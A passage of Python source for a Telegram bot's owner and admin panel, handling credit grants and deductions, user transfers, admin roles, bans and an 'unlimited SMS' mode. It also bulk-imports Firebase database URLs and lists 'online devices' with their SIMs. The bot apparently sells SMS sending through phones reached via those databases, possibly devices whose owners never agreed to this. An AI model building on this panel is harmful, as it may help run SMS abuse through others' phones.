    log_activity(d, "add_credits_all", uid, f"Added {amount} credits to {count} users")
    save(d)

    notification = (
        f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎉')} Aapko <b>{amount}</b> credits mile hain!\n"
        f"{em(EMOJI_MONEY, '💳')} <b>New Balance:</b> Check karein /start\n\n"
        f"{em(EMOJI_BELL, '📢')} <i>Credits add kar diye gaye hain.</i>"
    )

    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Added to All Users!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} {amount} credits each\n"
        f"{em(EMOJI_STAR, '👥')} Total users: <b>{count}</b>\n"
        f"{em(EMOJI_BELL, '📨')} Notified: <b>{success}</b> users",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct / Reset Credits from ALL Users</b>\n\n"
        f"Kitne credits sabhi users se katne / reset karne hain?\n"
        f"<i>Example: 5 (Ya saare reset karne ke liye jitne marzi ya saare credits katne ke liye amount daalein)</i>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} <i><b>Note:</b> Jin users ke credits bot se direct add kiye gaye hain, unke credits safe rahenge aur reset nahi honge!\n"
        f"{em(EMOJI_CROWN, '👑')} Owners/Super Admins se credits nahi katenge.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_all_credits_amount, F.text)
async def owner_deduct_all_credits_confirm(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    try:
        amount = int(msg.text.strip())
        if amount < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    await state.update_data(deduct_all_amount=amount)

    confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("✅ YES, DEDUCT", "owner:deduct_all_yes", EMOJI_CHECK, "✅"),
            btn("❌ NO, CANCEL", "owner:home", EMOJI_CROSS, "❌")
        ]
    ])

    await msg.answer(
        f"{em(EMOJI_WARNING, '⚠️')} <b>CONFIRMATION REQUIRED</b>\n\n"
        f"Kya aap sach mein sabhi users se <b>{amount}</b> credits deduct/reset karna chahte hain?\n"
        f"<i>(Direct bot se add kiye gaye credits safe rahenge)</i>",
        reply_markup=confirm_kb,
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:deduct_all_yes")
async def owner_deduct_all_yes_handler(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return

    data = await state.get_data()
    amount = data.get("deduct_all_amount", 0)
    await state.clear()

    users = d.get("users", {})
    if not users:
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return

    count = 0
    total_deducted = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])

    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins:
            continue

        current = udata.get("credits", 0)
        manual_added = udata.get("manual_added_credits", 0)
        
        safe_limit = manual_added
        deductible_pool = max(0, current - safe_limit)
        
        if deductible_pool > 0:
            to_deduct = min(amount, deductible_pool)
            if to_deduct > 0:
                udata["credits"] = current - to_deduct
                count += 1
                total_deducted += to_deduct

    log_activity(d, "deduct_credits_all", uid, f"Deducted {total_deducted} credits from {count} users with confirmation")
    save(d)

    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Deducted Successfully!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Deducted Amount: <b>{amount}</b>\n"
        f"{em(EMOJI_STAR, '👥')} Total users affected: <b>{count}</b>\n"
        f"{em(EMOJI_MONEY, '💳')} Total deducted: <b>{total_deducted}</b>\n"
        f"{em(EMOJI_CHECK, '🛡')} Manual/Direct Added Credits: <b>Protected (Safe)</b>\n\n"
        f"<i>{em(EMOJI_WARNING, '⚠️')} Notification nahi bheji gayi.</i>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await safe_answer(cq, "🚫 You are banned!", show_alert=True)
        return
    if not can_use(uid, d):
        await safe_answer(cq, "⛔ Access nahi hai!", show_alert=True)
        return

    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await safe_answer(cq, "❌ Minimum 2 credits chahiye transfer ke liye!", show_alert=True)
        return

    await state.set_state(S.transfer_credits_uid)
    half = current_credits // 2
    await cq.message.edit_text(
        f"💸 ◤{sc('transfer')}◢  {sc('credits')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_MONEY, '💰')}  {sc('aapke credits')} : <b>{current_credits}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')}  {sc('max transfer')}  : <b>{half}</b> ({sc('half credits')})\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤  {sc('step 1/2')}: {sc('uska user id bhejo jo credits paayega')}:",
        reply_markup=kb([(f"🔙 {sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_uid, F.text)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid User ID bhejo (numbers only):", parse_mode="HTML")
        return

    if target_uid == uid:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Apne aap ko transfer nahi kar sakte!", parse_mode="HTML")
        return

    if str(target_uid) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} User ID exist nahi karta!", parse_mode="HTML")
        return

    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Minimum 2 credits chahiye!", parse_mode="HTML")
        return

    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)

    half = current_credits // 2
    await msg.answer(
        f"💸 ◤{sc('transfer')}◢  {sc('step 2/2 — amount')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👤')}  {sc('target user')}  : <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')}  {sc('aapke credits')} : <b>{current_credits}</b>\n"
        f"{em(EMOJI_ROCKET, '📤')}  {sc('max transfer')}  : <b>{half}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ {sc('kitne credits bhejne hain?')} (max {half}):",
        reply_markup=kb([(f"🔙 {sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_amount, F.text)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id

    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo:", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")

    current_credits = get_user_credits(uid, d)
    max_transfer = current_credits // 2

    if amount > max_transfer:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap sirf {max_transfer} credits transfer kar sakte hain! (Half of {current_credits})", parse_mode="HTML")
        return

    if not deduct_credits(uid, amount, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient credits!", parse_mode="HTML")
        return

    add_credits(target_uid, amount, d, is_manual=False)
    log_activity(d, "credit_transfer", uid, f"Transferred {amount} credits to {target_uid}")
    save(d)

    await state.clear()

    try:
        _tr_bal = get_user_credits(target_uid, d)
        await send_rich_or_fallback(
            msg.bot, target_uid,
            rich_credits_blocks("💸 Credits Received!", [
                f"👤 Received from: {uid}",
                f"💰 Amount: {amount} credits",
            ], _tr_bal),
            f"{em(EMOJI_MONEY, '💸')} <b>Credits Received!</b>\n\n"
            f"{em(EMOJI_STAR, '👤')} Received from: <code>{uid}</code>\n"
            f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
            f"{em(EMOJI_MONEY, '💳')} New Balance: <b>{_tr_bal}</b>"
        )
    except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Transfer Successful!</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} To: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
        f"{em(EMOJI_MONEY, '💳')} Your Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0

    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b> firebase(s)",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Single Firebase</b>\n\nFirebase URL bhejo:\n"
        f"<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase, F.text)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with https://. Dobara bhejo:", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase Added!</b>\n\n{em(EMOJI_STAR, '🏷')} {label}\n{em(EMOJI_GEAR, '🔗')} <code>{url}</code>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase via TXT File</b>\n\n"
        f"Aap ek `.txt` file upload karein jisme Firebase URLs hon.\n\n"
        f"<b>Supported File Formats:</b>\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>\n\n"
        f"<i>Duplicate URLs auto-skip ho jayenge!</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return

    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf `.txt` file bhejiyega!", parse_mode="HTML")
        return

    file_info = await msg.bot.get_file(doc.file_id)
    downloaded_file = await msg.bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8', errors='ignore')

    lines = content.splitlines()
    fbs = d.get("firebases", [])
    existing_urls = {fb["url"].rstrip("/") for fb in fbs}

    added_count = 0
    skipped_count = 0
    processed_in_file = set()

    for line in lines:
        line = line.strip()
        if not line:
            continue

        if "|" in line:
            parts = line.split("|", 1)
            label = parts[0].strip()
            url = parts[1].strip()
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]

        if not (url.startswith("http://") or url.startswith("https://")):
            continue

        url = url.rstrip("/")

        if url in existing_urls or url in processed_in_file:
            skipped_count += 1
            continue

        processed_in_file.add(url)
        existing_urls.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({
            "id": fb_id,
            "url": url,
            "label": label,
            "added_at": int(time.time())
        })
        added_count += 1

    d["firebases"] = fbs
    save(d)
    await state.clear()

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase TXT Processed!</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Successfully Added : <b>{added_count}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Skipped (Duplicates) : <b>{skipped_count}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Total Firebase DBs  : <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya ek valid `.txt` document file upload karein!", parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0

    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await safe_answer(cq, "🗑 Removed!")
    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await safe_answer(cq, "⏳ Fetching...")

    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale:
        FB_DEVICE_COUNTS.pop(k, None)

    devices = get_cached_devices()
    if not devices:
        ensure_scan_running()
        devices = []

    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi — {em(EMOJI_GEAR, '🔄')} scan background mein chal raha hai (~3-4 min)")
    for dv in devices:
        dev_lines.append(
            f"  {em(EMOJI_PHONE, '📱')} <b>{dv['dev_name'][:20]}</b>\n"
            f"     {em(EMOJI_FIRE, '🔥')} {dv['fb_label'][:25]}\n"
            f"     {em(EMOJI_STAR, '📶')} SIMs: {len(dv['sims']) or 1}"
        )
    full = stats_text + "\n" + "\n".join(dev_lines)

    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"

    await cq.message.edit_text(
        full,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:stats"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    owners = d.get("owners", [])
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(owners)}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    if len(d.get("owners", [])) >= 6:
        await safe_answer(cq, "❌ Max 6!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nSuper Admin Chat ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_owner, F.text)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Chat ID bhejo.", parse_mode="HTML")
        return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already super admin!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Super Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_CROWN, '🔱')} <b>Aapko Super Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await safe_answer(cq, "❌ Main owner / Hardcoded Super Admin remove nahi ho sakta!", show_alert=True)
        return
    if del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
        await safe_answer(cq, "🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    admins = d.get("admins", [])
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(admins)}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nTelegram User ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_admin, F.text)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already admin/owner!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(new_id, f"{em(EMOJI_SHIELD, '🛡')} <b>Aapko Admin bana diya gaya!</b>\n/start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        save(d)
        await safe_answer(cq, "🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    d = load()
    mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
    await safe_answer(cq, f"Done! {mode}", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data == "owner:gunl:menu")
async def owner_global_unl_menu(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    gu = (load().get("global_unlimited") or {})
    rows = [
        [btn("⏱ with time (kitne din)", "owner:gunl:time", None, "")],
        [btn("♾️ without time (hamesha)", "owner:gunl:forever", None, "")],
    ]
    if gu.get("enabled"):
        rows.append([btn("⏹ sab unlimited band karo", "owner:gunl:off", None, "")])
    await cq.message.edit_text(
        f"🌍 <b>{sc('sab users unlimited mode')}</b>\n\n"
        f"{sc('sab users (banned chhod ke) ko unlimited SMS — bina credits ke')}:\n\n"
        f"⏱ {sc('with time')} — {sc('aap din doge, utne din ke liye (phir auto off)')}\n"
        f"♾️ {sc('without time')} — {sc('hamesha on (aap off karne tak)')}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:gunl:time")
async def owner_global_unl_time_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.global_unl_days)
    await cq.message.edit_text(
        f"⏱ <b>{sc('sab unlimited — with time')}</b>\n\n"
        f"{sc('kitne din ke liye? (numbers)')}\n<i>Example: 2 (do din)</i>",
        reply_markup=kb([(f"🔙 {sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.global_unl_days, F.text)
async def owner_global_unl_days(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        days = int(msg.text.strip())
        if days < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid din number bhejo (e.g. 2).", parse_mode="HTML")
        return
    d = load()
    now = int(time.time())
    d["global_unlimited"] = {"enabled": True, "until": now + days * 86400, "days": days, "set_at": now}
    save(d)
    await state.clear()
    d = load()
    await msg.answer(
        f"{em(EMOJI_CHECK, '🟢')} <b>{sc('sab unlimited ON')}</b>\n\n"
        f"⏱ {days} {sc('din')} — {sc('phir auto OFF')}\n"
        f"<i>{sc('sab users (banned chhod ke) ab bina credits SMS bhej sakte hain')}</i>",
        reply_markup=kb([(f"🔙 {sc('owner panel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:gunl:forever")
async def owner_global_unl_forever(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    d = load()
    d["global_unlimited"] = {"enabled": True, "until": 0, "set_at": int(time.time())}
    save(d)
    d = load()
    await safe_answer(cq, f"{em(EMOJI_CHECK, '🟢')} {sc('SAB UNLIMITED ON — hamesha (aap off karne tak)')}")
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:gunl:off")
async def owner_global_unl_off(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    d = load()
    d["global_unlimited"] = {"enabled": False, "until": 0, "set_at": 0}
    save(d)
    d = load()
    await safe_answer(cq, f"{em(EMOJI_CROSS, '🔴')} {sc('SAB UNLIMITED OFF')}")
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    prefix = parts[0]
    page = int(parts[3])
    text, markup = users_list_kb(d, prefix, page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.ban_user, F.text)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Admin/Owner ko ban nahi kar sakte!", parse_mode="HTML")
        return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban ho gaya!</b>\n<code>{ban_id}</code>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )
    try:
        await msg.bot.send_message(ban_id, f"{em(EMOJI_CROSS, '🚫')} Aapko ban kar diya gaya. Admin se contact karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
